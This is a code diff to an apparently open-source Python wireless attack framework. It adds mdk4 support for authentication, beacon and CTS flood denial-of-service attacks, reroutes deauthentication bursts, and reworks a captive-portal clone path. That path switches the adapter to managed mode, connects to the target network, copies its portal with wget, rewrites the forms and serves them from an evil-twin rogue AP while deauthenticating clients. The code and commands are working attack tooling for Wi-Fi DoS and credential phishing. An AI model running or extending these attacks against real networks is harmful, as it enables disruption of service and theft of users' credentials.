@@ -38,16 +38,20 @@
 Wireless attack framework for authorized wireless assessments.
 
 Single-operator, root-required tool. Drives airmon-ng / airodump-ng /
-aireplay-ng / airbase-ng / mdk3 / hostapd / dnsmasq through a menu-driven
-scan-then-queue workflow: scan the air, select target BSSIDs by number, build a
-queue of attacks, and execute it sequentially.
+aireplay-ng / airbase-ng / mdk4 (or mdk3) / hostapd / dnsmasq through a
+menu-driven scan-then-queue workflow: scan the air, select target BSSIDs by
+number, build a queue of attacks, and execute it sequentially.
 
 Interface model
     Prefers two adapters. The PRIMARY interface is dedicated to passive
-    capture/scan; the SECONDARY (when present) transmits attack frames, so
-    deauth bursts never interrupt an in-flight handshake capture. With a single
-    adapter it degrades to shared mode and the concurrent combos fall back to
-    sequential capture-then-deauth.
+    capture/scan; the SECONDARY (when present) transmits attack frames - deauth
+    bursts, the evil-twin/rogue AP - so transmission never interrupts an
+    in-flight handshake capture. With a single adapter it degrades to shared
+    mode and the concurrent combos fall back to sequential capture-then-deauth.
+    The captive-portal CLONE path is the one exception that needs a managed
+    radio: it temporarily returns the primary adapter to managed station mode
+    to associate with the target and fetch its portal, then restores monitor
+    mode before launching the rogue AP.
 
 Self-protection
     The operator's own connectivity is never touched. get_protected_interfaces()
@@ -95,7 +99,6 @@ from collections import deque
 from pathlib import Path
 from datetime import datetime
 from urllib.parse import parse_qs
-from bs4 import BeautifulSoup
 
 # =============================================================================
 # Terminal helpers
@@ -488,6 +491,43 @@ class InterfaceManager:
         # it bounces the operator's own link.
         subprocess.run(['sudo', 'systemctl', 'start', 'systemd-resolved'],
                        capture_output=True)
+
+    def suspend_monitor_to_managed(self, monitor_iface: str,
+                                   phys_iface: str) -> str:
+        """
+        Temporarily return a single adapter from monitor mode to NetworkManager-
+        managed station mode and hand it back to NM, so it can associate with a
+        real AP. Used only by the captive-portal clone path, which must connect
+        to the target network to fetch its portal; resume with
+        enable_monitor_mode() afterwards. Returns the managed interface name
+        (the physical name once the monitor vif is gone).
+        """
+        subprocess.run(['sudo', 'airmon-ng', 'stop', monitor_iface],
+                       capture_output=True)
+        time.sleep(1)
+        target = phys_iface or monitor_iface
+        # Force managed mode in case airmon-ng left a monitor vif behind.
+        check = subprocess.run(['sudo', 'iwconfig', target],
+                               capture_output=True, text=True)
+        if 'Mode:Monitor' in (check.stdout + check.stderr):
+            subprocess.run(['sudo', 'ip', 'link', 'set', target, 'down'],
+                           capture_output=True)
+            subprocess.run(['sudo', 'iwconfig', target, 'mode', 'managed'],
+                           capture_output=True)
+            subprocess.run(['sudo', 'ip', 'link', 'set', target, 'up'],
+                           capture_output=True)
+        # Hand the adapter back to NetworkManager so nmcli can drive the
+        # association.
+        subprocess.run(['sudo', 'nmcli', 'device', 'set', target, 'managed', 'yes'],
+                       capture_output=True)
+        self._released.discard(target)
+        self._released.discard(monitor_iface)
+        # We are no longer in monitor mode on the primary; clear bookkeeping so
+        # enable_monitor_mode() re-establishes it cleanly on resume.
+        if self.monitor_interface == monitor_iface:
+            self.monitor_interface = None
+        time.sleep(2)
+        return target
 
     def set_channel(self, interface: str, channel: str):
         """Set interface to a specific channel."""
@@ -1057,7 +1097,7 @@ class WirelessAttackFramework:
     def _check_tools(self):
         required = [
             'airmon-ng', 'airodump-ng', 'aireplay-ng', 'airbase-ng',
-            'aircrack-ng', 'mdk3', 'hostapd', 'dnsmasq', 'iptables',
+            'aircrack-ng', 'hostapd', 'dnsmasq', 'iptables',
             'nmcli', 'wget',
         ]
         missing = []
@@ -1069,6 +1109,22 @@ class WirelessAttackFramework:
                     self.tool_paths[tool] = found
                 else:
                     missing.append(tool)
+
+        # mdk3 and mdk4 are interchangeable for the DoS modes used here.
+        # Ubuntu 24.04 ships mdk4; older boxes ship mdk3. Cache whichever
+        # paths exist and only warn if BOTH are absent.
+        mdk_found = False
+        for mdk in ('mdk4', 'mdk3'):
+            path = self.tool_paths.get(mdk)
+            if path and Path(path).exists():
+                mdk_found = True
+                continue
+            found = self._find_tool(mdk)
+            if found:
+                self.tool_paths[mdk] = found
+                mdk_found = True
+        if not mdk_found:
+            missing.append('mdk3/mdk4')
 
         if self.tool_paths:
             self._save_config()
@@ -1083,6 +1139,25 @@ class WirelessAttackFramework:
             print(f"\nRequired tool '{name}' not found. Install it and restart.")
             input("Press Enter to continue...")
         return path
+
+    def _require_mdk(self) -> str | None:
+        """
+        Resolve mdk4 or mdk3 for the DoS attacks. Ubuntu 24.04 ships mdk4;
+        older boxes ship mdk3. The two share the same 'mdk <iface> <mode>
+        [options]' grammar for the auth/beacon/CTS modes used here, so the
+        caller's argv is identical either way. Prefers mdk4.
+        """
+        for mdk in ('mdk4', 'mdk3'):
+            path = self.tool_paths.get(mdk)
+            if path and Path(path).exists():
+                return path
+            found = self._find_tool(mdk)
+            if found:
+                self.tool_paths[mdk] = found
+                return found
+        print("\nRequired tool 'mdk4' (or 'mdk3') not found. Install it and restart.")
+        input("Press Enter to continue...")
+        return None
 
     # ------------------------------------------------------------------
     # Loot directory (persistent, mode-restricted)
@@ -1304,9 +1379,9 @@ class WirelessAttackFramework:
             print("\n" + "-" * 60)
             print("ADD ATTACK:")
             print("  1.  Deauthentication")
-            print("  2.  DoS - Authentication Flood (mdk3)")
-            print("  3.  DoS - Beacon Flood (mdk3)")
-            print("  4.  DoS - CTS Frame Flood (mdk3)")
+            print("  2.  DoS - Authentication Flood (mdk4/mdk3)")
+            print("  3.  DoS - Beacon Flood (mdk4/mdk3)")
+            print("  4.  DoS - CTS Frame Flood (mdk4/mdk3)")
             print("  5.  Evil Twin / Rogue AP")
             print("  6.  Karma / MANA Attack")
             print("  7.  Captive Portal - Default")
@@ -1496,12 +1571,12 @@ class WirelessAttackFramework:
 
     def _attack_auth_dos(self, target: dict, params: dict):
         mon = self.iface_mgr.monitor_interface
-        mdk3 = self._require_tool('mdk3')
-        if not mdk3:
+        mdk = self._require_mdk()
+        if not mdk:
             return
 
         print(f"\nAUTHENTICATION DoS ATTACK → {target['essid']}")
-        cmd = ['sudo', mdk3, mon, 'a', '-a', target['bssid']]
+        cmd = ['sudo', mdk, mon, 'a', '-a', target['bssid']]
         print("Press Ctrl+C to stop\n")
         try:
             subprocess.run(cmd)
@@ -1510,13 +1585,13 @@ class WirelessAttackFramework:
 
     def _attack_beacon_flood(self, target: dict, params: dict):
         mon = self.iface_mgr.monitor_interface
-        mdk3 = self._require_tool('mdk3')
-        if not mdk3:
+        mdk = self._require_mdk()
+        if not mdk:
             return
 
         count = input("Number of fake APs (default 50): ").strip() or '50'
         print(f"\nBEACON FLOOD ATTACK")
-        cmd = ['sudo', mdk3, mon, 'b', '-n', count, '-s', '1000']
+        cmd = ['sudo', mdk, mon, 'b', '-n', count, '-s', '1000']
         print("Press Ctrl+C to stop\n")
         try:
             subprocess.run(cmd)
@@ -1525,13 +1600,13 @@ class WirelessAttackFramework:
 
     def _attack_cts_flood(self, target: dict, params: dict):
         mon = self.iface_mgr.monitor_interface
-        mdk3 = self._require_tool('mdk3')
-        if not mdk3:
+        mdk = self._require_mdk()
+        if not mdk:
             return
 
         channel = target.get('channel', '6').strip()
         print(f"\nCTS FRAME FLOOD → Channel {channel}")
-        cmd = ['sudo', mdk3, mon, 'c', '-c', channel]
+        cmd = ['sudo', mdk, mon, 'c', '-c', channel]
         print("Press Ctrl+C to stop\n")
         try:
             subprocess.run(cmd)
@@ -1686,22 +1761,24 @@ class WirelessAttackFramework:
         print(f"\nCapture : {out}-01.cap")
         print(f"Crack   : aircrack-ng -w /path/to/wordlist {out}-01.cap")
 
-    def _send_deauth(self, target: dict, count: str = '5', client_mac: str | None = None):
+    def _send_deauth(self, target: dict, count: str = '5',
+                     client_mac: str | None = None, iface: str | None = None):
         """
-        Send deauth frames using the attack interface.
-        Uses secondary interface when available so the capture interface
-        is never interrupted mid-listen.
+        Send deauth frames. Defaults to the attack interface so a concurrent
+        capture on the primary is never interrupted; callers that need the
+        deauth on a specific radio (e.g. the evil-twin+portal combo, where the
+        attack interface is busy beaconing the rogue AP) pass iface explicitly.
         """
         aireplay = self.tool_paths.get('aireplay-ng')
         if not aireplay:
             return
-        iface = self.iface_mgr.attack_interface
-        if not iface:
+        tx_iface = iface or self.iface_mgr.attack_interface
+        if not tx_iface:
             return
         cmd = ['sudo', aireplay, '--deauth', count, '-a', target['bssid']]
         if client_mac:
             cmd += ['-c', client_mac]
-        cmd.append(iface)
+        cmd.append(tx_iface)
         try:
             subprocess.run(cmd, timeout=15,
                            stdout=subprocess.DEVNULL,
@@ -1848,13 +1925,21 @@ class WirelessAttackFramework:
         self._create_default_portal(portal_dir, target['essid'])
 
         if self.iface_mgr.dual_interface:
-            # Start deauth loop in background thread on capture interface
-            # while the portal runs on the attack interface
+            # The rogue AP now runs on the attack interface (see
+            # _launch_rogue_ap_with_portal), so the deauth MUST run on the
+            # capture interface - one radio each - and that radio has to be
+            # parked on the target channel for the bursts to reach the real AP
+            # (the attack interface's channel is set by airbase-ng via -c).
+            ch = target.get('channel', '6').strip()
+            if self.iface_mgr.capture_interface:
+                self.iface_mgr.set_channel(self.iface_mgr.capture_interface, ch)
+
             stop_deauth = threading.Event()
 
             def deauth_loop():
                 while not stop_deauth.is_set():
-                    self._send_deauth(target, count='5')
+                    self._send_deauth(target, count='5',
+                                      iface=self.iface_mgr.capture_interface)
                     stop_deauth.wait(timeout=5)
 
             dt = threading.Thread(target=deauth_loop, daemon=True)
@@ -1903,27 +1988,54 @@ class WirelessAttackFramework:
             if input("Continue? (y/n): ").strip().lower() != 'y':
                 return
 
-        print(f"\n[1/5] Connecting to {ssid} via {connection_target['bssid']}...")
-        phys = self.iface_mgr.physical_interface
-        if not phys or not self.iface_mgr.connect_to_network(phys, ssid):
-            print("Failed to connect.")
+        # The primary adapter is in monitor mode, so it cannot associate with
+        # the target to fetch the portal. Temporarily drop it back to managed
+        # station mode for the clone, then restore monitor mode afterwards.
+        # try/finally guarantees monitor mode is restored even if the connect
+        # or clone fails.
+        mon_iface  = self.iface_mgr.monitor_interface
+        phys_iface = self.iface_mgr.physical_interface
+        if not mon_iface or not phys_iface:
+            print("No primary interface available for portal clone.")
             return
 
-        print("[2/5] Detecting captive portal URL...")
-        portal_url = self._detect_captive_portal() or f"http://192.168.1.1"
-        print(f"Portal URL: {portal_url}")
+        print(f"\n[1/6] Suspending monitor mode on {mon_iface} for managed connect...")
+        managed_if = self.iface_mgr.suspend_monitor_to_managed(mon_iface, phys_iface)
 
-        print("[3/5] Cloning portal with wget...")
-        if not self._clone_portal_wget(portal_url, portal_dir):
-            print("Clone failed.")
-            self.iface_mgr.disconnect_from_network(phys)
+        clone_ok = False
+        try:
+            print(f"[2/6] Connecting to {ssid} via {connection_target['bssid']} on {managed_if}...")
+            if not self.iface_mgr.connect_to_network(managed_if, ssid):
+                print("Failed to connect - cannot clone portal.")
+                return
+
+            print("[3/6] Detecting captive portal URL...")
+            portal_url = self._detect_captive_portal() or "http://192.168.1.1"
+            print(f"Portal URL: {portal_url}")
+
+            print("[4/6] Cloning portal with wget...")
+            if not self._clone_portal_wget(portal_url, portal_dir):
+                print("Clone failed.")
+                return
+
+            print("[5/6] Modifying forms...")
+            self._modify_portal_forms(portal_dir)
+            clone_ok = True
+        finally:
+            print(f"[6/6] Disconnecting and restoring monitor mode on {phys_iface}...")
+            self.iface_mgr.disconnect_from_network(managed_if)
+            subprocess.run(['sudo', 'ip', 'addr', 'flush', 'dev', managed_if],
+                           capture_output=True)
+            resumed = self.iface_mgr.enable_monitor_mode(phys_iface)
+            if resumed:
+                print(f"Monitor mode restored: {resumed}")
+            else:
+                print("Warning: failed to restore monitor mode on "
+                      f"{phys_iface} - capture interface may be down.")
+
+        if not clone_ok:
+            print("Portal clone aborted - not launching rogue AP.")
             return
-
-        print("[4/5] Modifying forms...")
-        self._modify_portal_forms(portal_dir)
-
-        print("[5/5] Disconnecting from target...")
-        self.iface_mgr.disconnect_from_network(phys)
 
         input("\nPress Enter to launch rogue AP, Ctrl+C to cancel...")
         self._launch_rogue_ap_with_portal(target, portal_dir, 'cloned')
@@ -1969,6 +2081,16 @@ class WirelessAttackFramework:
             return False
 
     def _modify_portal_forms(self, portal_dir: Path):
+        # Lazy import: only the portal-clone path needs BeautifulSoup, so the
+        # other 16 attacks still run on a box without python3-bs4 installed.
+        try:
+            from bs4 import BeautifulSoup
+        except ImportError:
+            print("python3-bs4 not installed - cannot rewrite cloned portal "
+                  "forms. Install it (apt install python3-bs4) to use the "
+                  "portal-clone path.")
+            return
+
         clone_path = portal_dir / 'cloned'
         html_files = [
             f for f in clone_path.glob('**/*.html')
@@ -2077,10 +2199,16 @@ class WirelessAttackFramework:
         # already snapshotted.
         self._snapshot_host_state()
 
-        mon      = self.iface_mgr.monitor_interface
+        # Run the rogue AP on the dedicated attack interface (falls back to the
+        # primary in single-adapter mode), matching _attack_evil_twin and the
+        # dual-interface design - NOT the capture interface.
+        ap_iface = self.iface_mgr.attack_interface
         airbase  = self._require_tool('airbase-ng')
         dnsmasq  = self._require_tool('dnsmasq')
         if not airbase or not dnsmasq:
+            return
+        if not ap_iface:
+            print("No monitor interface available for rogue AP.")
             return
 
         # Free port 80 and 53
@@ -2182,7 +2310,7 @@ class WirelessAttackFramework:
                 'sudo', airbase,
                 '-e', target_ssid,
                 '-c', target.get('channel', '6').strip(),
-                mon
+                ap_iface
             ]
             # Detached from the tty: airbase-ng, like airodump-ng, puts the
             # controlling terminal into raw mode, and it runs backgrounded here
@@ -2415,9 +2543,12 @@ class WirelessAttackFramework:
             if not self._setup_interfaces():
                 return
 
-            mon = self.iface_mgr.capture_interface
-
             while True:
+                # Re-read the capture interface each pass: the portal-clone
+                # path can cycle the primary adapter through managed mode and
+                # back, which may rename the monitor interface.
+                mon = self.iface_mgr.capture_interface
+
                 # Instantiate scan engine for this scan session
                 self.scan_engine = ScanEngine(
                     monitor_interface=mon,
